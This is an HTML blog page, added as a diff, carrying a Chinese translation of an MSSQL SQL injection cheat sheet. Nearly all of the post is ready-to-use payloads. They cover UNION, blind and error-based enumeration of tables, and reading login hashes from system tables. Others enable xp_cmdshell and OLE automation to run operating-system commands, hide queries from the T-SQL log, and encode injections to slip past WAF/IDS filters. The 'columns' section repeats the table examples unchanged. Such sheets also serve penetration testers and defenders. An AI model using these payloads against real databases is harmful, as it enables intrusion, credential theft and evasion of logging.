@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="SQLi,翻译," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="翻译：SQL注入之MSSQL篇。">
+<meta name="keywords" content="SQLi,翻译">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLi MSSQL基础知识">
+<meta property="og:url" content="http://yoursite.com/2018/03/21/SQLi_MSSQL/index.html">
+<meta property="og:site_name" content="Sec-note">
+<meta property="og:description" content="翻译：SQL注入之MSSQL篇。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-21T10:12:24.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQLi MSSQL基础知识">
+<meta name="twitter:description" content="翻译：SQL注入之MSSQL篇。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/03/21/SQLi_MSSQL/"/>
+
+
+
+
+
+  <title>SQLi MSSQL基础知识 | Sec-note</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sec-note</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/03/21/SQLi_MSSQL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Sec-note">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sec-note">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQLi MSSQL基础知识</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-03-21T15:54:24+08:00">
+                2018-03-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/翻译/" itemprop="url" rel="index">
+                    <span itemprop="name">翻译</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>翻译：SQL注入之MSSQL篇。</p>
+<a id="more"></a>
+<h4 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a><a href="https://websec.ca/kb/sql_injection#MSSQL_Default_Databases" target="_blank" rel="noopener">MSSQL</a></h4><h4 id="默认数据库"><a href="#默认数据库" class="headerlink" title="默认数据库"></a>默认数据库</h4><pre><code>pubs    Not available on MSSQL 2005
+model    Available in all versions
+msdb    Available in all versions
+tempdb    Available in all versions
+northwind    Available in all versions
+information_schema    Availalble from MSSQL 2000 and higher
+</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>当你在注入的时候，以下可以注释掉查询的其他部分</p>
+<pre><code>/*    C-style comment
+--    SQL comment
+;%00    Nullbyte
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT * FROM Users WHERE username = &apos;&apos; OR 1=1 --&apos; AND password = &apos;&apos;;
+SELECT * FROM Users WHERE id = &apos;&apos; UNION SELECT 1, 2, 3/*&apos;;
+</code></pre><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><pre><code>@@VERSION
+</code></pre><p><strong>例子</strong></p>
+<pre><code>True if MSSQL version is 2008.
+SELECT * FROM Users WHERE id = &apos;1&apos; AND @@VERSION LIKE &apos;%2008%&apos;;
+</code></pre><p>输出也会包含<code>Windows</code>操作系统的版本。</p>
+<h4 id="数据库凭证"><a href="#数据库凭证" class="headerlink" title="数据库凭证"></a>数据库凭证</h4><pre><code>Database..Table    master..syslogins, master..sysprocesses
+Columns    name, loginame
+Current User    user, system_user, suser_sname(), is_srvrolemember(&apos;sysadmin&apos;)
+Database Credentials    SELECT user, password FROM master.dbo.sysxlogins
+</code></pre><p><strong>例子</strong></p>
+<pre><code>Return current user:
+SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;
+
+Check if user is admin:
+SELECT (CASE WHEN (IS_SRVROLEMEMBER(&apos;sysadmin&apos;)=1) THEN &apos;1&apos; ELSE &apos;0&apos; END);
+</code></pre><h4 id="数据库名字"><a href="#数据库名字" class="headerlink" title="数据库名字"></a>数据库名字</h4><pre><code>Database.Table    master..sysdatabases
+Column    name
+Current DB    DB_NAME(i)
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT DB_NAME(5);
+SELECT name FROM master..sysdatabases;
+</code></pre><h4 id="服务器名字"><a href="#服务器名字" class="headerlink" title="服务器名字"></a>服务器名字</h4><pre><code>@@SERVERNAME
+SERVERPROPERTY()
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT SERVERPROPERTY(&apos;productversion&apos;), SERVERPROPERTY(&apos;productlevel&apos;), SERVERPROPERTY(&apos;edition&apos;);
+</code></pre><p><strong>注意</strong></p>
+<ul>
+<li>SERVERPROPERTY() 适用于<code>MSSQL 2005</code>和更高版本</li>
+</ul>
+<h4 id="表和列"><a href="#表和列" class="headerlink" title="表和列"></a>表和列</h4><h5 id="测试列个数"><a href="#测试列个数" class="headerlink" title="测试列个数"></a>测试列个数</h5><pre><code>ORDER BY n+1;
+</code></pre><p><strong>例子</strong></p>
+<pre><code>Given the query: SELECT username, password, permission FROM Users WHERE id = &apos;1&apos;;
+
+1&apos; ORDER BY 1--    True
+1&apos; ORDER BY 2--    True
+1&apos; ORDER BY 3--    True
+1&apos; ORDER BY 4--    False - Query is only using 3 columns
+-1&apos; UNION SELECT 1,2,3--    True
+</code></pre><p><strong>注意</strong>： 依次增加这个数字，直到得到错误的响应。</p>
+<p>以下内容可用于获取当前查询中的列。</p>
+<pre><code>GROUP BY / HAVING
+</code></pre><p><strong>例子</strong></p>
+<pre><code>Given the query: SELECT username, password, permission FROM Users WHERE id = &apos;1&apos;;
+
+1&apos; HAVING 1=1--    Column &apos;Users.username&apos; is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+1&apos; GROUP BY username HAVING 1=1--    Column &apos;Users.password&apos; is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+1&apos; GROUP BY username, password HAVING 1=1--    Column &apos;Users.permission&apos; is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
+1&apos; GROUP BY username, password, permission HAVING 1=1--    No Error
+</code></pre><p><strong>注意</strong></p>
+<p>一旦包含所有的列，将不会返回任何错误。</p>
+<h5 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h5><p>可以从<code>information_schema.tables</code>和<code>master..sysobjects</code>两个数据库中获取表。</p>
+<p><strong>Union</strong></p>
+<pre><code>UNION SELECT name FROM master..sysobjects WHERE xtype=&apos;U&apos;
+</code></pre><p><strong>Blind</strong></p>
+<pre><code>AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;
+</code></pre><p><strong>Error</strong></p>
+<pre><code>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
+</code></pre><p><strong>注意</strong></p>
+<pre><code>Xtype =&apos;U&apos;用于用户定义的表格。 您可以使用&apos;V&apos;查看视图。
+</code></pre><h5 id="获取列"><a href="#获取列" class="headerlink" title="获取列"></a>获取列</h5><p>我们可以从<code>information_schema.columns</code>和<code>masters..syscolumns</code>两个不同的数据库中注入得到列。</p>
+<p><strong>Union</strong></p>
+<pre><code>UNION SELECT name FROM master..sysobjects WHERE xtype=&apos;U&apos;
+</code></pre><p><strong>Blind</strong></p>
+<pre><code>AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables &gt; &apos;A&apos;
+</code></pre><p><strong>Error</strong></p>
+<pre><code>AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
+AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
+</code></pre><p><strong>注意</strong></p>
+<p><code>Xtype =&#39;U&#39;</code>用于用户定义的表格。 您可以使用’V’查看视图。</p>
+<h5 id="一次获取多张表和列"><a href="#一次获取多张表和列" class="headerlink" title="一次获取多张表和列"></a>一次获取多张表和列</h5><p>以下三个查询将创建一个临时的表/列，并将用户定义的表插入其中。然后它将展示表的内容并删除这个表。</p>
+<p><code>Create Temp Table/Column and Insert Data:</code></p>
+<pre><code>创建一个临时的表/列并插入数据
+AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=&apos;:&apos; SELECT @xy=@xy+&apos; &apos;+name FROM sysobjects WHERE xtype=&apos;U&apos; AND name&gt;@xy SELECT @xy AS xy INTO TMP_DB END;
+</code></pre><p><code>Dump Content</code></p>
+<pre><code>AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);
+</code></pre><p><code>Delete Table</code></p>
+<pre><code>AND 1=0; DROP TABLE TMP_DB;
+</code></pre><p>一个更简单的方法适用于<code>MSSQL 2005</code>以及高版本。<code>XML</code>函数<code>path</code>用作连接器，允许一个查询检索所有的表。</p>
+<pre><code>SELECT table_name %2b &apos;, &apos; FROM information_schema.tables FOR XML PATH(&apos;&apos;)    SQL Server 2005+
+</code></pre><p><strong>注意</strong></p>
+<p>可以使用十六进制编码混淆攻击</p>
+<pre><code>&apos; AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
+</code></pre><h4 id="逃逸引号"><a href="#逃逸引号" class="headerlink" title="逃逸引号"></a>逃逸引号</h4><pre><code>SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
+</code></pre><h4 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h4><pre><code>SELECT CONCAT(&apos;a&apos;,&apos;a&apos;,&apos;a&apos;); (SQL SERVER 2012)
+SELECT &apos;a&apos;+&apos;d&apos;+&apos;mi&apos;+&apos;n&apos;;
+</code></pre><h4 id="条件声明"><a href="#条件声明" class="headerlink" title="条件声明"></a>条件声明</h4><pre><code>IF
+CASE
+</code></pre><p><strong>例子</strong></p>
+<pre><code>IF 1=1 SELECT &apos;true&apos; ELSE SELECT &apos;false&apos;;
+SELECT CASE WHEN 1=1 THEN true ELSE false END;
+</code></pre><p><strong>注意</strong></p>
+<p>IF不能应用在<code>SELECT</code>查询里面。</p>
+<h4 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h4><pre><code>WAITFOR DELAY &apos;time_to_pass&apos;;
+WAITFOR TIME &apos;time_to_execute&apos;;
+</code></pre><p><strong>例子</strong></p>
+<pre><code>IF 1=1 WAITFOR DELAY &apos;0:0:5&apos; ELSE WAITFOR DELAY &apos;0:0:0&apos;;
+</code></pre><h4 id="OPENROWSET-攻击"><a href="#OPENROWSET-攻击" class="headerlink" title="OPENROWSET 攻击"></a>OPENROWSET 攻击</h4><pre><code>SELECT * FROM OPENROWSET(&apos;SQLOLEDB&apos;, &apos;127.0.0.1&apos;;&apos;sa&apos;;&apos;p4ssw0rd&apos;, &apos;SET FMTONLY OFF execute master..xp_cmdshell &quot;dir&quot;&apos;);
+</code></pre><h4 id="系统命令执行"><a href="#系统命令执行" class="headerlink" title="系统命令执行"></a>系统命令执行</h4><p>包含一个名为<code>xp_cmdshell</code>的扩展存储过程，可用于执行操作系统命令。</p>
+<pre><code>EXEC master.dbo.xp_cmdshell &apos;cmd&apos;;
+</code></pre><p>从<code>MSSQL 2005</code>之后的版本，<code>xp_cmsshell</code>默认不再开启，使用以下命令可以手动开启。</p>
+<pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1
+EXEC sp_configure reconfigure
+EXEC sp_configure &apos;xp_cmdshell&apos;, 1
+EXEC sp_configure reconfigure
+</code></pre><p>或者，你可以创建自己的程序来达到同样的结果。</p>
+<pre><code>DECLARE @execmd INT
+EXEC SP_OACREATE &apos;wscript.shell&apos;, @execmd OUTPUT
+EXEC SP_OAMETHOD @execmd, &apos;run&apos;, null, &apos;%systemroot%\system32\cmd.exe /c&apos;
+</code></pre><p>如果这个<code>MSSQL</code>版本高于2000，你需要再另外执行以下的命令，才能让上述命令执行成功。</p>
+<pre><code>EXEC sp_configure &apos;show advanced options&apos;, 1
+EXEC sp_configure reconfigure
+EXEC sp_configure &apos;OLE Automation Procedures&apos;, 1
+EXEC sp_configure reconfigure
+</code></pre><p><strong>例子</strong></p>
+<pre><code>Checks to see if xp_cmdshell is loaded, if it is, it checks if it is 
+active and then proceeds to run the &apos;dir&apos; command and inserts the results into TMP_DB:
+
+&apos; IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME=&apos;TMP_DB&apos;) DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N&apos;[dbo].[xp_cmdshell]&apos;) AND OBJECTPROPERTY (id, N&apos;IsExtendedProc&apos;) = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure &apos;xp_cmdshell&apos; IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell &apos;dir&apos; SELECT @a=&apos;&apos; SELECT @a=Replace(@a%2B&apos;&lt;br&gt;&lt;/font&gt;&lt;font color=&quot;black&quot;&gt;&apos;%2Bdir,&apos;&lt;dir&gt;&apos;,&apos;&lt;/font&gt;&lt;font color=&quot;orange&quot;&gt;&apos;) FROM %23Data WHERE dir&gt;@a DROP TABLE %23Data END ELSE SELECT @a=&apos;xp_cmdshell not enabled&apos; DROP TABLE %23xp_cmdshell END ELSE SELECT @a=&apos;xp_cmdshell not found&apos; SELECT @a AS tbl INTO TMP_DB--
+</code></pre><p>显示内容</p>
+<pre><code>&apos; UNION SELECT tbl FROM TMP_DB--
+</code></pre><p>删除表</p>
+<pre><code>&apos; DROP TABLE TMP_DB--
+</code></pre><h4 id="隐藏查询"><a href="#隐藏查询" class="headerlink" title="隐藏查询"></a>隐藏查询</h4><p>将<code>sp_password</code>附加到查询的末尾会将其从T-SQL日志中隐藏，作为安全措施。</p>
+<p><strong>例子</strong></p>
+<pre><code>&apos; AND 1=1--sp_password
+</code></pre><p><strong>输出</strong></p>
+<ul>
+<li>在此事件的文本中找到’sp_password’。</li>
+<li>出于安全原因，文字已被此注释取代。</li>
+</ul>
+<h4 id="堆查询"><a href="#堆查询" class="headerlink" title="堆查询"></a>堆查询</h4><p><code>MSSQL</code>支持堆查询</p>
+<pre><code>&apos; AND 1=0 INSERT INTO ([column1], [column2]) VALUES (&apos;value1&apos;, &apos;value2&apos;);
+</code></pre><h4 id="模糊和混淆"><a href="#模糊和混淆" class="headerlink" title="模糊和混淆"></a>模糊和混淆</h4><h5 id="允许其他字符"><a href="#允许其他字符" class="headerlink" title="允许其他字符"></a>允许其他字符</h5><p>以下的字符可以被用作空格</p>
+<pre><code>01    Start of Heading
+02    Start of Text
+03    End of Text
+04    End of Transmission
+05    Enquiry
+06    Acknowledge
+07    Bell
+08    Backspace
+09    Horizontal Tab
+0A    New Line
+0B    Vertical Tab
+0C    New Page
+0D    Carriage Return
+0E    Shift Out
+0F    Shift In
+10    Data Link Escape
+11    Device Control 1
+12    Device Control 2
+13    Device Control 3
+14    Device Control 4
+15    Negative Acknowledge
+16    Synchronous Idle
+17    End of Transmission Block
+18    Cancel
+19    End of Medium
+1A    Substitute
+1B    Escape
+1C    File Separator
+1D    Group Separator
+1E    Record Separator
+1F    Unit Separator
+20    Space
+25    %
+</code></pre><p><strong>例子</strong></p>
+<pre><code>S%E%L%E%C%T%01column%02FROM%03table;
+A%%ND 1=%%%%%%%%1;
+</code></pre><p><strong>注意</strong></p>
+<p>百分号关键字仅适用于<code>ASP</code>的<code>Web</code>应用程序。</p>
+<p>以下的字符也可以避免使用空格。</p>
+<pre><code>22    &quot;
+28    (
+29    )
+5B    [
+5D    ]
+</code></pre><p><strong>例子</strong></p>
+<pre><code>UNION(SELECT(column)FROM(table));
+SELECT&quot;table_name&quot;FROM[information_schema].[tables];
+</code></pre><h5 id="在AND-OR-之后使用的其他字符"><a href="#在AND-OR-之后使用的其他字符" class="headerlink" title="在AND/OR 之后使用的其他字符"></a>在AND/OR 之后使用的其他字符</h5><pre><code>01 - 20    Range
+21    !
+2B    +
+2D    -
+2E    .
+5C    \
+7E    ~
+</code></pre><p><strong>例子</strong></p>
+<pre><code>SELECT 1FROM[table]WHERE\1=\1AND\1=\1;
+</code></pre><p><strong>注意</strong></p>
+<p>反斜杠似乎不适用于<code>MSSQL 2000</code>。</p>
+<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>对你的注入语句进行编码，有时候可以绕过<code>WAF/IDS</code>。</p>
+<pre><code>URL Encoding    SELECT %74able_%6eame FROM information_schema.tables;
+Double URL Encoding    SELECT %2574able_%256eame FROM information_schema.tables;
+Unicode Encoding    SELECT %u0074able_%u6eame FROM information_schema.tables;
+Invalid Hex Encoding (ASP)    SELECT %tab%le_%na%me FROM information_schema.tables;
+Hex Encoding    &apos; AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x53454c4543542031 AS VARCHAR(4000)); EXEC (@S);--
+HTML Entities (Needs to be verified)    %26%2365%3B%26%2378%3B%26%2368%3B%26%2332%3B%26%2349%3B%26%2361%3B%26%2349%3B
+</code></pre><h4 id="密码加密"><a href="#密码加密" class="headerlink" title="密码加密"></a>密码加密</h4><p>密码以0x0100开始，0x之后的第一个字节是常量;接下来的八个字节是散列盐，剩余的80个字节是两个散列，前40个字节是密码的区分大小写散列，而第二个40个字节是大写。</p>
+<pre><code>0x0100236A261CE12AB57BA22A7F44CE3B780E52098378B65852892EEE91C0784B911D76BF4EB124550ACABDFD1457
+</code></pre><h4 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h4><p>一个<code>Metasploit</code>模块<a href="http://www.metasploit.com/modules/auxiliary/analyze/jtr_mssql_fast" target="_blank" rel="noopener">JTR</a>可以进行破解密码。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+          
+            <a href="/tags/翻译/" rel="tag"># 翻译</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/21/Stack/" rel="next" title="栈">
+                <i class="fa fa-chevron-left"></i> 栈
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/22/SQLi_ORACLE/" rel="prev" title="SQLi Oracle 基础知识">
+                SQLi Oracle 基础知识 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Sec-note</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">60</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/sie504" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#MSSQL"><span class="nav-number">1.</span> <span class="nav-text">MSSQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#默认数据库"><span class="nav-number">2.</span> <span class="nav-text">默认数据库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#注释"><span class="nav-number">3.</span> <span class="nav-text">注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#版本"><span class="nav-number">4.</span> <span class="nav-text">版本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库凭证"><span class="nav-number">5.</span> <span class="nav-text">数据库凭证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#数据库名字"><span class="nav-number">6.</span> <span class="nav-text">数据库名字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#服务器名字"><span class="nav-number">7.</span> <span class="nav-text">服务器名字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#表和列"><span class="nav-number">8.</span> <span class="nav-text">表和列</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#测试列个数"><span class="nav-number">8.1.</span> <span class="nav-text">测试列个数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取表"><span class="nav-number">8.2.</span> <span class="nav-text">获取表</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取列"><span class="nav-number">8.3.</span> <span class="nav-text">获取列</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#一次获取多张表和列"><span class="nav-number">8.4.</span> <span class="nav-text">一次获取多张表和列</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逃逸引号"><span class="nav-number">9.</span> <span class="nav-text">逃逸引号</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串连接"><span class="nav-number">10.</span> <span class="nav-text">字符串连接</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#条件声明"><span class="nav-number">11.</span> <span class="nav-text">条件声明</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间"><span class="nav-number">12.</span> <span class="nav-text">时间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#OPENROWSET-攻击"><span class="nav-number">13.</span> <span class="nav-text">OPENROWSET 攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#系统命令执行"><span class="nav-number">14.</span> <span class="nav-text">系统命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#隐藏查询"><span class="nav-number">15.</span> <span class="nav-text">隐藏查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#堆查询"><span class="nav-number">16.</span> <span class="nav-text">堆查询</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#模糊和混淆"><span class="nav-number">17.</span> <span class="nav-text">模糊和混淆</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#允许其他字符"><span class="nav-number">17.1.</span> <span class="nav-text">允许其他字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在AND-OR-之后使用的其他字符"><span class="nav-number">17.2.</span> <span class="nav-text">在AND/OR 之后使用的其他字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#编码"><span class="nav-number">17.3.</span> <span class="nav-text">编码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密码加密"><span class="nav-number">18.</span> <span class="nav-text">密码加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#密码破解"><span class="nav-number">19.</span> <span class="nav-text">密码破解</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
